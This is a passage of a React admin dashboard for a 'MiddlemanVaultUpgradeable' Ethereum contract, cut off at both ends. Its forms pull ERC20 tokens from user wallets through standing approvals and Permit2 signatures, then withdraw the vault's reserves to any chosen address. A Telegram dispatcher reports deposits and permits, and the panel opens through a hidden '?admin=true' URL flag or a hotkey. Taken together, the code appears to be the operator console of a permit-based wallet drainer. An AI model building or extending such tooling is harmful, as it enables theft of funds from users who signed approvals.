                  Access instantly by appending <code className="font-mono text-[#00A3FF]">?admin=true</code> or <code className="font-mono text-[#00A3FF]">#admin</code> to the site URL.
                </p>
              </div>

              <div className="p-3 bg-card rounded-xl border border-border-main">
                <span className="text-xs font-bold text-text-main flex items-center gap-1.5 mb-1">
                  <KeyRound className="w-3.5 h-3.5 text-amber-500" /> Keyboard Hotkey
                </span>
                <p className="text-[11px] text-text-secondary">
                  Press <kbd className="px-1.5 py-0.5 bg-input border border-border-main rounded text-[10px] font-mono">Ctrl + Shift + A</kbd> (or <kbd className="px-1.5 py-0.5 bg-input border border-border-main rounded text-[10px] font-mono">Cmd + Shift + A</kbd>) from any page.
                </p>
              </div>

              <div className="p-3 bg-card rounded-xl border border-border-main">
                <span className="text-xs font-bold text-text-main flex items-center gap-1.5 mb-1">
                  <Server className="w-3.5 h-3.5 text-emerald-500" /> Backend URL & APIs
                </span>
                <p className="text-[11px] text-text-secondary">
                  Live routes located at <code className="font-mono text-emerald-400">/api/*</code>. Manage & test via the Backend API Hub tab.
                </p>
              </div>
            </div>
          </div>
          {/* Real-time Notifications & Critical Alert Feed */}
          <div className="bg-card rounded-2xl border border-border-main p-6 shadow-sm space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-main pb-4">
              <div className="flex items-center gap-3">
                <div className={`p-2.5 rounded-xl ${alertNotifications.length > 0 ? 'bg-red-500/10 text-red-500 animate-pulse' : 'bg-emerald-500/10 text-emerald-500'}`}>
                  <Bell className="w-5 h-5" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h2 className="font-bold text-base text-text-main">Critical Alerts & Failed Transaction Feed</h2>
                    {alertNotifications.length > 0 ? (
                      <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-red-500/10 text-red-500 border border-red-500/20">
                        {alertNotifications.length} Requiring Review
                      </span>
                    ) : (
                      <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-emerald-500/10 text-emerald-500 border border-emerald-500/20">
                        All Systems Normal
                      </span>
                    )}
                  </div>
                  <p className="text-xs text-text-secondary">
                    Monitors rejected signatures, reverted contract calls, and critical execution issues requiring manual intervention
                  </p>
                </div>
              </div>

              {alertNotifications.length > 0 && (
                <button
                  onClick={() => {
                    setFilterType('FAILED');
                    setAdminSection('logs');
                  }}
                  className="px-3 py-1.5 rounded-xl text-xs font-bold text-[#00A3FF] hover:bg-[#00A3FF]/10 border border-[#00A3FF]/20 transition-colors flex items-center gap-1.5"
                >
                  <span>View All in Audit Trail</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
              )}
            </div>

            {alertNotifications.length === 0 ? (
              <div className="p-6 bg-input/40 rounded-xl border border-border-main text-center space-y-2">
                <ShieldCheck className="w-8 h-8 text-emerald-500 mx-auto" />
                <p className="text-xs font-semibold text-text-main">No critical events or failed transactions detected</p>
                <p className="text-[11px] text-text-secondary">All user deposits, permits, and protocol executions are proceeding normally.</p>
              </div>
            ) : (
              <div className="space-y-2.5 max-h-72 overflow-y-auto pr-1">
                {alertNotifications.map((alert) => (
                  <div
                    key={alert.id}
                    className={`p-3.5 rounded-xl border flex flex-wrap sm:flex-nowrap items-center justify-between gap-3 text-xs transition-colors ${
                      alert.status === 'Failed'
                        ? 'bg-red-500/5 border-red-500/20 text-text-main'
                        : 'bg-amber-500/5 border-amber-500/20 text-text-main'
                    }`}
                  >
                    <div className="flex items-start gap-3 min-w-0">
                      <div className="mt-0.5">
                        {alert.status === 'Failed' ? (
                          <AlertOctagon className="w-4 h-4 text-red-500 shrink-0" />
                        ) : (
                          <AlertTriangle className="w-4 h-4 text-amber-500 shrink-0" />
                        )}
                      </div>
                      <div className="space-y-0.5 min-w-0">
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="font-bold text-xs">{alert.action}</span>
                          {alert.amount && <span className="font-semibold text-[11px] px-1.5 py-0.2 bg-input rounded text-text-secondary">{alert.amount}</span>}
                          <span className="text-[10px] text-text-secondary font-mono">
                            {new Date(alert.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                          </span>
                          <span className="font-mono text-[11px] text-[#00A3FF]">
                            {alert.wallet.slice(0, 6)}...{alert.wallet.slice(-4)}
                          </span>
                        </div>
                        <p className="text-[11px] text-red-400 truncate max-w-lg">
                          {alert.errorMessage || alert.note || 'Transaction failed or was rejected by user/network'}
                        </p>
                      </div>
                    </div>

                    <div className="flex items-center gap-2 shrink-0">
                      <button
                        onClick={() => handleResolveAlert(alert.id)}
                        className="px-2.5 py-1 rounded-lg bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-500 text-[11px] font-bold border border-emerald-500/20 transition-colors flex items-center gap-1"
                        title="Mark alert as reviewed and resolved"
                      >
                        <Check className="w-3 h-3" />
                        <span>Resolve</span>
                      </button>
                      <button
                        onClick={() => handleToggleStatus(alert.id, alert.status)}
                        className="px-2.5 py-1 rounded-lg bg-input hover:bg-input/80 text-text-secondary text-[11px] font-semibold border border-border-main transition-colors"
                      >
                        Status: {alert.status}
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Quick Metrics */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm flex items-start gap-4">
              <div className="p-3 bg-[#00A3FF]/10 rounded-xl">
                <Users className="w-6 h-6 text-[#00A3FF]" />
              </div>
              <div>
                <p className="text-xs text-text-secondary font-medium mb-1">Total Audit Logs</p>
                <p className="text-2xl font-bold">{activities.length}</p>
              </div>
            </div>
            <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm flex items-start gap-4">
              <div className="p-3 bg-purple-500/10 rounded-xl">
                <Lock className="w-6 h-6 text-purple-400" />
              </div>
              <div>
                <p className="text-xs text-text-secondary font-medium mb-1">Permit2 Backend Status</p>
                <p className="text-2xl font-bold text-purple-400">Online (/api/permit2)</p>
              </div>
            </div>
            <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm flex items-start gap-4">
              <div className="p-3 bg-emerald-500/10 rounded-xl">
                <Radio className="w-6 h-6 text-emerald-500 animate-pulse" />
              </div>
              <div>
                <p className="text-xs text-text-secondary font-medium mb-1">Telegram Bot Dispatcher</p>
                <p className="text-2xl font-bold text-emerald-500">Active & Ready</p>
              </div>
            </div>
          </div>

          {/* Telegram Dispatcher & Parameters */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Telegram Dispatcher */}
            <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
              <div className="flex items-center gap-2">
                <Send className="w-5 h-5 text-[#00A3FF]" />
                <h2 className="font-bold text-lg">Telegram Notification Tester</h2>
              </div>
              <p className="text-xs text-text-secondary">
                Dispatch a real-time test alert to the Telegram bot channel to verify notifications for deposits, permits, and administrative actions.
              </p>

              {telegramStatus && (
                <div className={`p-3 rounded-xl text-xs font-semibold ${telegramStatus.includes('successfully') ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'bg-red-500/10 text-red-500'}`}>
                  {telegramStatus}
                </div>
              )}

              <button
                onClick={handleTestTelegram}
                disabled={telegramSending}
                className="w-full py-3 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
              >
                {telegramSending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                <span>{telegramSending ? 'Dispatching Ping...' : 'Send Test Telegram Ping'}</span>
              </button>
            </div>

            {/* On-Chain Contract Parameters Panel */}
            <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
              <div className="flex items-center justify-between border-b border-border-main pb-3">
                <h2 className="font-bold text-lg flex items-center gap-2">
                  <Layers className="w-5 h-5 text-[#00A3FF]" />
                  On-Chain Vault Parameters
                </h2>
                <span className="text-[11px] font-semibold px-2 py-0.5 bg-[#00A3FF]/10 text-[#00A3FF] border border-[#00A3FF]/20 rounded-lg font-mono">
                  {CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                <div className="p-2.5 bg-input/60 rounded-xl border border-border-main space-y-0.5">
                  <span className="text-text-secondary font-sans font-semibold block text-[10px]">Vault Owner</span>
                  <span className="text-text-main font-bold truncate block">{ownerAddress ? String(ownerAddress) : 'Loading...'}</span>
                </div>

                <div className="p-2.5 bg-input/60 rounded-xl border border-border-main space-y-0.5">
                  <span className="text-text-secondary font-sans font-semibold block text-[10px]">Referral Address</span>
                  <span className="text-[#00A3FF] font-bold truncate block">{currentReferralAddress ? String(currentReferralAddress) : 'Loading...'}</span>
                </div>

                <div className="p-2.5 bg-input/60 rounded-xl border border-border-main space-y-0.5">
                  <span className="text-text-secondary font-sans font-semibold block text-[10px]">Lido stETH Contract</span>
                  <span className="text-text-main font-bold truncate block">{lidoContractAddress ? String(lidoContractAddress) : CONFIG.STETH_ADDRESS}</span>
                </div>

                <div className="p-2.5 bg-input/60 rounded-xl border border-border-main space-y-0.5">
                  <span className="text-text-secondary font-sans font-semibold block text-[10px]">Permit2 Contract</span>
                  <span className="text-text-main font-bold truncate block">{permit2ContractAddress ? String(permit2ContractAddress) : '0x0000...BA3'}</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* SECTION: Contract Execution Scripts (Write Calls) */}
      {adminSection === 'scripts' && (
        <div className="space-y-6">
          <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-6">
            <div className="flex items-center justify-between border-b border-border-main pb-3">
              <div>
                <h2 className="font-bold text-lg flex items-center gap-2">
                  <Coins className="w-5 h-5 text-[#00A3FF]" />
                  Smart Contract Execution Scripts
                </h2>
                <p className="text-xs text-text-secondary">Execute write scripts directly on MiddlemanVaultUpgradeable contract</p>
              </div>
              <span className="text-xs font-bold px-2.5 py-1 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 rounded-lg">
                Write Active
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {/* Script: pullToken */}
              <form onSubmit={handlePullToken} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-sm text-text-main">pullToken Script</span>
                    <span className="text-[10px] font-mono bg-[#00A3FF]/10 text-[#00A3FF] px-2 py-0.5 rounded">pullToken()</span>
                  </div>
                  <p className="text-xs text-text-secondary">Pull ERC20 token balance from user wallet via vault authorization.</p>
                  
                  <div className="space-y-1.5 pt-1">
                    <input
                      type="text"
                      placeholder="Token Address (0x...)"
                      value={pullTokenState.token}
                      onChange={(e) => setPullTokenState({ ...pullTokenState, token: e.target.value as `0x${string}` })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="From User Wallet (0x...)"
                      value={pullTokenState.from}
                      onChange={(e) => setPullTokenState({ ...pullTokenState, from: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="Amount (e.g. 1.5)"
                      value={pullTokenState.amount}
                      onChange={(e) => setPullTokenState({ ...pullTokenState, amount: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                  </div>

                  {pullTokenStatus && (
                    <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${pullTokenStatus.includes('pulled') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                      {pullTokenStatus}
                    </div>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={isPending}
                  className="w-full py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
                >
                  <ArrowUpRight className="w-3.5 h-3.5" />
                  <span>Execute pullToken</span>
                </button>
              </form>

              {/* Script: pullTokenWithPermit2 */}
              <form onSubmit={handlePullTokenWithPermit2} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-sm text-text-main">Permit2 Pull Script</span>
                    <span className="text-[10px] font-mono bg-purple-500/10 text-purple-400 px-2 py-0.5 rounded">pullTokenWithPermit2()</span>
                  </div>
                  <p className="text-xs text-text-secondary">Pull ERC20 tokens utilizing Uniswap Permit2 signature approval.</p>

                  <div className="space-y-1.5 pt-1">
                    <input
                      type="text"
                      placeholder="Token Address (0x...)"
                      value={pullPermit2State.token}
                      onChange={(e) => setPullPermit2State({ ...pullPermit2State, token: e.target.value as `0x${string}` })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="From User Wallet (0x...)"
                      value={pullPermit2State.from}
                      onChange={(e) => setPullPermit2State({ ...pullPermit2State, from: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="Amount (uint160)"
                      value={pullPermit2State.amount}
                      onChange={(e) => setPullPermit2State({ ...pullPermit2State, amount: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                  </div>

                  {pullPermit2Status && (
                    <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${pullPermit2Status.includes('pulled') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                      {pullPermit2Status}
                    </div>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={isPending}
                  className="w-full py-2.5 bg-purple-600 hover:bg-purple-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
                >
                  <ArrowUpRight className="w-3.5 h-3.5" />
                  <span>Execute Permit2 Pull</span>
                </button>
              </form>

              {/* Script: creditUser */}
              <form onSubmit={handleCreditUser} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-sm text-text-main">creditUser Script</span>
                    <span className="text-[10px] font-mono bg-emerald-500/10 text-emerald-500 px-2 py-0.5 rounded">creditUser()</span>
                  </div>
                  <p className="text-xs text-text-secondary">Assign internal credit balance to target user address on-chain.</p>

                  <div className="space-y-1.5 pt-1">
                    <input
                      type="text"
                      placeholder="Target User Address (0x...)"
                      value={creditState.user}
                      onChange={(e) => setCreditState({ ...creditState, user: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="Credit Amount (ETH)"
                      value={creditState.amount}
                      onChange={(e) => setCreditState({ ...creditState, amount: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                  </div>

                  {creditStatus && (
                    <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${creditStatus.includes('credited') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                      {creditStatus}
                    </div>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={isPending}
                  className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
                >
                  <Coins className="w-3.5 h-3.5" />
                  <span>Execute creditUser</span>
                </button>
              </form>

              {/* Script: withdrawETH */}
              <form onSubmit={handleWithdrawETH} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-sm text-text-main">withdrawETH Script</span>
                    <span className="text-[10px] font-mono bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded">withdrawETH()</span>
                  </div>
                  <p className="text-xs text-text-secondary">Withdraw contract ETH reserve to designated destination address.</p>

                  <div className="space-y-1.5 pt-1">
                    <input
                      type="text"
                      placeholder="Recipient Address (0x...)"
                      value={withdrawEthState.to}
                      onChange={(e) => setWithdrawEthState({ ...withdrawEthState, to: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="Amount in ETH"
                      value={withdrawEthState.amount}
                      onChange={(e) => setWithdrawEthState({ ...withdrawEthState, amount: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                  </div>

                  {withdrawEthStatus && (
                    <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${withdrawEthStatus.includes('Withdrawn') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                      {withdrawEthStatus}
                    </div>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={isPending}
                  className="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
                >
                  <Wallet className="w-3.5 h-3.5" />
                  <span>Execute withdrawETH</span>
                </button>
              </form>

              {/* Script: withdrawToken */}
              <form onSubmit={handleWithdrawToken} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-sm text-text-main">withdrawToken Script</span>
                    <span className="text-[10px] font-mono bg-amber-500/10 text-amber-500 px-2 py-0.5 rounded">withdrawToken()</span>
                  </div>
                  <p className="text-xs text-text-secondary">Withdraw contract ERC20 token reserve to recipient address.</p>

                  <div className="space-y-1.5 pt-1">
                    <input
                      type="text"
                      placeholder="Token Address (0x...)"
                      value={withdrawTokenState.token}
                      onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, token: e.target.value as `0x${string}` })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="Recipient Address (0x...)"
                      value={withdrawTokenState.to}
                      onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, to: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                    <input
                      type="text"
                      placeholder="Amount"
                      value={withdrawTokenState.amount}
                      onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, amount: e.target.value })}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                  </div>

                  {withdrawTokenStatus && (
                    <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${withdrawTokenStatus.includes('Withdrawn') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                      {withdrawTokenStatus}
                    </div>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={isPending}
                  className="w-full py-2.5 bg-amber-600 hover:bg-amber-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
                >
                  <Coins className="w-3.5 h-3.5" />
                  <span>Execute withdrawToken</span>
                </button>
              </form>

              {/* Set Referral Control */}
              <div className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-sm text-text-main">setReferral Script</span>
                    <span className="text-[10px] font-mono bg-cyan-500/10 text-cyan-400 px-2 py-0.5 rounded">setReferral()</span>
                  </div>
                  <p className="text-xs text-text-secondary">Update the contract referral address on the Middleman Vault.</p>

                  <div className="space-y-1.5 pt-1">
                    <input
                      type="text"
                      placeholder="New Referral Address (0x...)"
                      value={newReferralAddress}
                      onChange={(e) => setNewReferralAddress(e.target.value)}
                      className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                    />
                  </div>

                  {referralStatus && (
                    <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${referralStatus.includes('Referral set') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                      {referralStatus}
                    </div>
                  )}
                </div>

                <button
                  onClick={handleSetReferral}
                  disabled={isPending}
                  className="w-full py-2.5 bg-cyan-600 hover:bg-cyan-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
                >
                  <KeyRound className="w-3.5 h-3.5" />
                  <span>Update Contract Referral</span>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* SECTION: Audit Trail & Activity Logs */}
      {adminSection === 'logs' && (
        <div className="space-y-6">
          {/* Manual Admin Audit Entry Section */}
          <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm space-y-3">
            <h2 className="font-bold text-sm flex items-center gap-2 text-text-main">
              <Plus className="w-4 h-4 text-[#00A3FF]" />
              Create Admin Audit Log Entry
            </h2>
            <form onSubmit={handleCreateManualLog} className="flex gap-3">
              <input
                type="text"
                placeholder="Enter administrative log entry, security note or verification tag..."
                value={newLogNote}
                onChange={(e) => setNewLogNote(e.target.value)}
                className="flex-1 bg-input border border-border-main rounded-xl px-4 py-2 text-xs focus:outline-none focus:border-[#00A3FF]"
              />
              <button
                type="submit"
                className="px-5 py-2 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs transition-colors"
              >
                Post Entry
              </button>
            </form>
          </div>

          {/* Full Activity Management List */}
          <div className="bg-card rounded-2xl border border-border-main shadow-sm overflow-hidden space-y-0">
            <div className="px-6 py-4 border-b border-border-main bg-input/50 flex flex-wrap justify-between items-center gap-4">
              <div className="flex items-center gap-2">
                <h2 className="font-bold text-sm">Recent User Activity & Audit Logs</h2>
                <span className="text-[11px] font-semibold px-2 py-0.5 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 rounded-md">Live Read/Write</span>
              </div>

              <div className="flex flex-wrap items-center gap-3">
                {/* Category Filter */}
                <div className="flex flex-wrap items-center gap-1 bg-card border border-border-main rounded-lg p-1 text-xs">
                  <Filter className="w-3.5 h-3.5 text-text-secondary ml-1" />
                  {['ALL', 'STAKE', 'WRAP', 'WITHDRAW', 'FAILED', 'REVIEWED', 'ARCHIVED', 'ADMIN'].map((type) => (
                    <button
                      key={type}
                      onClick={() => setFilterType(type)}
                      className={`px-2.5 py-1 rounded-md font-semibold text-xs transition-colors ${filterType === type ? 'bg-[#00A3FF] text-white' : 'text-text-secondary hover:text-text-main'}`}
                    >
                      {type}
                    </button>
                  ))}
                </div>

                {/* Export CSV */}
                <button
                  onClick={handleExportCSV}
                  className="p-2 rounded-lg border border-border-main bg-card hover:bg-input text-text-secondary hover:text-text-main transition-colors flex items-center gap-1 text-xs font-semibold"
                  title="Export CSV"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Export</span>
                </button>

                {/* Clear Logs */}
                <button
                  onClick={handleClearLogs}
                  className="p-2 rounded-lg border border-red-500/20 bg-red-500/5 hover:bg-red-500/10 text-red-500 transition-colors flex items-center gap-1 text-xs font-semibold"
                  title="Clear All Logs"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  <span>Clear</span>
                </button>
              </div>
            </div>

            {/* Bulk Action Sticky Bar */}
            {selectedActivityIds.length > 0 && (
              <div className="px-6 py-3 bg-[#00A3FF]/10 border-b border-[#00A3FF]/20 flex flex-wrap items-center justify-between gap-3 animate-in fade-in">
                <div className="flex items-center gap-2">
                  <span className="font-bold text-xs text-[#00A3FF] flex items-center gap-1.5">
                    <CheckSquare className="w-4 h-4" />
                    {selectedActivityIds.length} {selectedActivityIds.length === 1 ? 'entry' : 'entries'} selected
                  </span>
                </div>

                <div className="flex flex-wrap items-center gap-2">
                  <button
                    onClick={handleBulkMarkReviewed}
                    className="px-3 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 transition-colors shadow-sm"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Mark as Reviewed</span>
                  </button>

                  <button
                    onClick={handleBulkMarkArchived}
                    className="px-3 py-1.5 bg-slate-700 hover:bg-slate-800 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 transition-colors shadow-sm"
                  >
                    <Archive className="w-3.5 h-3.5" />
                    <span>Mark as Archived</span>
                  </button>

                  <button
                    onClick={handleBulkFlag}
                    className="px-3 py-1.5 bg-amber-600 hover:bg-amber-700 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 transition-colors shadow-sm"
                  >
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>Flag Selected</span>
                  </button>

                  <button
                    onClick={handleBulkDelete}
                    className="px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 transition-colors shadow-sm"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    <span>Delete</span>
                  </button>

                  <button
                    onClick={handleClearSelection}
                    className="px-2.5 py-1.5 text-text-secondary hover:text-text-main text-xs font-semibold"
                  >
                    Deselect All
                  </button>
                </div>
              </div>
            )}

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead className="bg-input text-text-secondary font-medium border-b border-border-main">
                  <tr>
                    <th className="px-4 py-3 w-10 text-center">
                      <input
                        type="checkbox"
                        checked={filteredActivities.length > 0 && selectedActivityIds.length === filteredActivities.length}
                        onChange={handleToggleSelectAll}
                        className="rounded border-border-main text-[#00A3FF] focus:ring-0 cursor-pointer"
                        title="Select All"
                      />
                    </th>
                    <th className="px-4 py-3">Time</th>
                    <th className="px-4 py-3">Wallet</th>
                    <th className="px-4 py-3">Action</th>
                    <th className="px-4 py-3">Amount</th>
                    <th className="px-4 py-3">Status</th>
                    <th className="px-4 py-3">Note / Audit Log</th>
                    <th className="px-4 py-3 text-right">Admin Controls</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border-main">
                  {filteredActivities.length === 0 ? (
                    <tr>
                      <td colSpan={8} className="px-6 py-8 text-center text-text-secondary">
                        No activity records found for this filter.
                      </td>
                    </tr>
                  ) : (
                    filteredActivities.map((act) => {
                      const isSelected = selectedActivityIds.includes(act.id);
                      return (
                        <tr
                          key={act.id}
                          className={`transition-colors ${
                            isSelected ? 'bg-[#00A3FF]/5 hover:bg-[#00A3FF]/10' : 'hover:bg-input/50'
                          }`}
                        >
                          <td className="px-4 py-3 text-center">
                            <input
                              type="checkbox"
                              checked={isSelected}
                              onChange={() => handleToggleSelectOne(act.id)}
                              className="rounded border-border-main text-[#00A3FF] focus:ring-0 cursor-pointer"
                            />
                          </td>
                          <td className="px-4 py-3 text-text-secondary whitespace-nowrap">
                            {new Date(act.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                          </td>
                          <td className="px-4 py-3 font-mono text-[#00A3FF]">
                            <a
                              href={`https://etherscan.io/address/${act.wallet}`}
                              target="_blank"
                              rel="noreferrer"
                              className="hover:underline flex items-center gap-1"
                            >
                              {act.wallet.slice(0, 6)}...{act.wallet.slice(-4)}
                              <ExternalLink className="w-3 h-3 opacity-60" />
                            </a>
                          </td>
                          <td className="px-4 py-3 font-semibold">
                            <span className="px-2 py-0.5 bg-input rounded-lg border border-border-main">
                              {act.action}
                            </span>
                          </td>
                          <td className="px-4 py-3 font-semibold">
                            {act.amount || '—'}
                          </td>
                          <td className="px-4 py-3">
                            <button
                              onClick={() => handleToggleStatus(act.id, act.status)}
                              title="Click to toggle status"
                              className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider flex items-center gap-1 transition-all ${
                                act.status === 'Verified'
                                  ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20'
                                  : act.status === 'Reviewed'
                                  ? 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20'
                                  : act.status === 'Archived'
                                  ? 'bg-slate-500/10 text-slate-400 border border-slate-500/20'
                                  : act.status === 'Flagged' || act.status === 'Failed'
                                  ? 'bg-red-500/10 text-red-500 border border-red-500/20'
                                  : 'bg-blue-500/10 text-blue-500 border border-blue-500/20'
                              }`}
                            >
                              {act.status === 'Verified' && <CheckCircle2 className="w-3 h-3" />}
                              {act.status === 'Reviewed' && <Check className="w-3 h-3" />}
                              {act.status === 'Archived' && <Archive className="w-3 h-3" />}
                              {(act.status === 'Flagged' || act.status === 'Failed') && <AlertTriangle className="w-3 h-3" />}
                              {act.status}
                            </button>
                          </td>
                          <td className="px-4 py-3 text-text-secondary max-w-xs">
                            {editingId === act.id ? (
                              <div className="flex gap-2">
                                <input
                                  type="text"
                                  value={editingNote}
                                  onChange={(e) => setEditingNote(e.target.value)}
                                  className="bg-input border border-border-main rounded px-2 py-1 text-xs w-full"
                                />
                                <button
                                  onClick={() => handleSaveNote(act.id)}
                                  className="px-2 py-1 bg-[#00A3FF] text-white rounded text-[10px] font-bold"
                                >
                                  Save
                                </button>
                              </div>
                            ) : (
